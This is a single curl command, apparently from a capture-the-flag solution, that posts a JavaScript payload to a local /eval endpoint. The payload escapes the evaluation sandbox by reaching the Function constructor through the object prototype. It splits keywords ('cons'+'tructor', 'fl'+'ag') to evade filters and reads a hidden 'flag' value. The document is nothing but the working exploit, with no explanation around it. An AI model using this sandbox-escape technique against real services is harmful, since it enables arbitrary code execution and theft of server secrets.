curl -s -X POST http://localhost:3000/eval \
  -H "Content-Type: application/json" \
  -d @- << 'EOF'
{"code":"({})['__proto__']['cons'+'tructor']['cons'+'tructor'](\"return this['fl'+'ag']\")()"}
EOF


